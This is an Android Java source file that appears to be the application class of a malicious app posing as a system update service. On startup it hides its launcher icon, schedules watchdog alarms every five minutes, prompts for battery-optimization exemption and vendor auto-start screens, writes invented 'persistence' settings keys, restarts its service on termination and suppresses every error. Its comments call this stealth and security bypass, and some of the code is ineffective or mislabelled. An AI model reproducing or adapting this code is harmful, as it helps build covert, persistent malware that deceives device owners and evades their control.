// SystemApplication.java
package com.system.service.update;

import android.app.Application;
import android.os.Build;
import android.os.StrictMode;
import android.os.PowerManager;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;

public class SystemApplication extends Application {
    
    @Override
    public void onCreate() {
        super.onCreate();
        initializeSecurityBypass();
        initializePersistence();
        hideApplication();
        requestBatteryOptimizationBypass();
        requestAutoStart();
        enableSystemPersistence();
    }
    
    private void initializeSecurityBypass() {
        try {
            // Disable strict mode
            StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder()
                .detectAll()
                .penaltyLog()
                .build());
            
            // Set system properties for stealth
            System.setProperty("persist.sys.strictmode.disable", "true");
            System.setProperty("debug.force_rtl", "false");
            
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void initializePersistence() {
        try {
            // Schedule periodic health checks
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            
            Intent intent = new Intent(this, AlarmReceiver.class);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this, 0, intent, 
                PendingIntent.FLAG_UPDATE_CURRENT | 
                (Build.VERSION.SDK_INT >= 31 ? 0x4000000 : 0)
            );
            
            if (alarmManager != null) {
                alarmManager.setInexactRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    60000,
                    300000,  // 5 minutes instead of 15 for faster restart
                    pendingIntent
                );
            }
            
            // Schedule watchdog alarm (every 5 minutes)
            Intent watchdogIntent = new Intent(this, AlarmReceiver.class);
            watchdogIntent.setAction("WATCHDOG_CHECK");
            PendingIntent watchdogPendingIntent = PendingIntent.getBroadcast(
                this, 999, watchdogIntent,
                PendingIntent.FLAG_UPDATE_CURRENT |
                (Build.VERSION.SDK_INT >= 31 ? 0x4000000 : 0)
            );
            
            if (alarmManager != null) {
                alarmManager.setInexactRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    300000,  // First in 5 minutes
                    300000,  // Every 5 minutes
                    watchdogPendingIntent
                );
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void hideApplication() {
        try {
            // Hide from launcher
            PackageManager pm = getPackageManager();
            pm.setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void requestBatteryOptimizationBypass() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                String packageName = getPackageName();
                
                // Check if already whitelisted
                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + packageName));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                }
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void requestAutoStart() {
        try {
            // Try to write auto-start setting
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Settings.System.putInt(
                    getContentResolver(),
                    "auto_start",
                    1
                );
            }
            
            // Try manufacturer-specific auto-start intent
            Intent intent = new Intent();
            intent.setClassName("com.android.settings", 
                "com.android.settings.Settings$AppBatteryUsageActivity");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            // Silent fail - will try alternative
        }
        
        // Try Xiaomi auto-start
        try {
            Intent intent = new Intent();
            intent.setClassName("com.miui.securitycenter",
                "com.miui.permcenter.autostart.AutoStartManagementActivity");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            // Not a Xiaomi device
        }
        
        // Try Huawei auto-start
        try {
            Intent intent = new Intent();
            intent.setClassName("com.huawei.systemmanager",
                "com.huawei.systemmanager.optimize.process.ProtectActivity");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            // Not a Huawei device
        }
    }
    
    private void enableSystemPersistence() {
        try {
            // Write to system settings for persistence
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Settings.Global.putString(
                    getContentResolver(),
                    "sys.persistent_app",
                    getPackageName()
                );
            }
            
            // Try to prevent process kill
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Settings.Global.putInt(
                    getContentResolver(),
                    "sys.keep_app_alive",
                    1
                );
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    @Override
    public void onTerminate() {
        super.onTerminate();
        restartService();
    }
    
    private void restartService() {
        try {
            Intent intent = new Intent(this, SystemService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
}
